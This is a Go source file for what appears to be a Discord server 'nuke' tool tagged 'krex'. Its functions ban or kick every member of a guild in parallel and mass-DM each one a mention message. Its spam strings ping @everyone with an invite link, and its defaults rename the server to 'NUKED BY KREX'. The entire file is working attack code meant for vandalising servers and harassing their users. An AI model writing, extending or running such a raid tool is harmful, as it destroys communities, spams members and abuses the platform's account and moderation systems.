package main

import (
	"fmt"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
)

var spamMessages = []string{
	"# @everyone @here gg krex was here discord.gg/brazilia",
	"# @everyone @here krexontop discord.gg/brazilia",
	"# @everyone @here krex runs discord discord.gg/brazilia",
	"# @everyone @here krex was here 💀 discord.gg/brazilia",
}

var channelPrefixes = []string{
	"krex-",
	"krexontop-",
	"hacked-by-krex-",
	"nuked-by-",
	"destroyed-",
}

type NukeOptions struct {
	BanAll           bool
	KickAll          bool
	DmAll            bool
	DmMsg            string
	ChangeServerName bool
	NewServerName    string
}

var DefaultNukeOptions = NukeOptions{
	BanAll:           false,
	KickAll:          false,
	DmAll:            true,
	DmMsg:            "@everyone server got nuked by krex",
	ChangeServerName: true,
	NewServerName:    "💀 NUKED BY KREX 💀",
}

func BanAllMembers(s *discordgo.Session, guildID string, options NukeOptions) {

	members, err := s.GuildMembers(guildID, "", 1000)
	if err != nil {
		printColoredLine("[!] Error getting guild members: "+err.Error(), colorRed)
		return
	}

	var bannableMembers []*discordgo.Member
	for _, member := range members {

		if member.User.Bot {
			continue
		}

		if member.User.ID == s.State.User.ID {
			continue
		}

		bannableMembers = append(bannableMembers, member)
	}

	printColoredLine(fmt.Sprintf("[*] Banning %d members...", len(bannableMembers)), colorCyan)

	var wg sync.WaitGroup
	wg.Add(len(bannableMembers))

	for _, member := range bannableMembers {
		go func(m *discordgo.Member) {
			defer wg.Done()

			if options.DmAll {

				dmChannel, err := s.UserChannelCreate(m.User.ID)
				if err == nil {

					mentionMsg := fmt.Sprintf("<@%s> %s", m.User.ID, options.DmMsg)
					_, _ = s.ChannelMessageSend(dmChannel.ID, mentionMsg)
				}
			}

			err := s.GuildBanCreateWithReason(guildID, m.User.ID, "krex was here", 0)
			if err != nil {

				if options.KickAll {
					err = s.GuildMemberDeleteWithReason(guildID, m.User.ID, "krex was here")
					if err != nil {

						printColoredLine(fmt.Sprintf("[!] Failed to ban/kick %s: %s", m.User.Username, err), colorRed)
						return
					}
					printColoredLine(fmt.Sprintf("[+] Kicked member: %s", m.User.Username), colorYellow)
				}
			} else {
				printColoredLine(fmt.Sprintf("[+] Banned member: %s", m.User.Username), colorGreen)
			}

			time.Sleep(100 * time.Millisecond)
		}(member)
	}

	wg.Wait()
	printColoredLine("[+] Member ban/kick operations completed", colorGreen)
}

func KickAllMembers(s *discordgo.Session, guildID string, options NukeOptions) {

	members, err := s.GuildMembers(guildID, "", 1000)
	if err != nil {
		printColoredLine("[!] Error getting guild members: "+err.Error(), colorRed)
		return
	}

	var kickableMembers []*discordgo.Member
	for _, member := range members {

		if member.User.Bot {
			continue
		}

		if member.User.ID == s.State.User.ID {
			continue
		}

		kickableMembers = append(kickableMembers, member)
	}

	printColoredLine(fmt.Sprintf("[*] Kicking %d members...", len(kickableMembers)), colorCyan)

	var wg sync.WaitGroup
	wg.Add(len(kickableMembers))

	for _, member := range kickableMembers {
		go func(m *discordgo.Member) {
			defer wg.Done()

			if options.DmAll {

				dmChannel, err := s.UserChannelCreate(m.User.ID)
				if err == nil {

					mentionMsg := fmt.Sprintf("<@%s> %s", m.User.ID, options.DmMsg)
					_, _ = s.ChannelMessageSend(dmChannel.ID, mentionMsg)
				}
			}

			err = s.GuildMemberDeleteWithReason(guildID, m.User.ID, "krex was here")
			if err != nil {
				printColoredLine(fmt.Sprintf("[!] Failed to kick %s: %s", m.User.Username, err), colorRed)
				return
			}

			printColoredLine(fmt.Sprintf("[+] Kicked member: %s", m.User.Username), colorYellow)

			time.Sleep(100 * time.Millisecond)
		}(member)
	}

	wg.Wait()
	printColoredLine("[+] Member kick operations completed", colorGreen)
}

func DmAllMembers(s *discordgo.Session, guildID string, message string) {

	members, err := s.GuildMembers(guildID, "", 1000)
	if err != nil {
		printColoredLine("[!] Error getting guild members: "+err.Error(), colorRed)
		return
	}

	var targetMembers []*discordgo.Member
	for _, member := range members {

		if member.User.Bot {
			continue
		}

		if member.User.ID == s.State.User.ID {
			continue
		}

		targetMembers = append(targetMembers, member)
	}

	printColoredLine(fmt.Sprintf("[*] DMing %d members...", len(targetMembers)), colorCyan)

	var wg sync.WaitGroup
	wg.Add(len(targetMembers))

	for _, member := range targetMembers {
		go func(m *discordgo.Member) {
			defer wg.Done()

			dmChannel, err := s.UserChannelCreate(m.User.ID)
			if err != nil {
				printColoredLine(fmt.Sprintf("[!] Failed to create DM channel for %s: %s", m.User.Username, err), colorRed)
				return
			}

			mentionMsg := fmt.Sprintf("<@%s> %s", m.User.ID, message)
			_, err = s.ChannelMessageSend(dmChannel.ID, mentionMsg)
			if err != nil {
				printColoredLine(fmt.Sprintf("[!] Failed to send DM to %s: %s", m.User.Username, err), colorRed)
				return
			}

			printColoredLine(fmt.Sprintf("[+] Sent DM to: %s", m.User.Username), colorGreen)

			time.Sleep(200 * time.Millisecond)
		}(member)
	}

	wg.Wait()
	printColoredLine("[+] All DMs sent successfully", colorGreen)
}
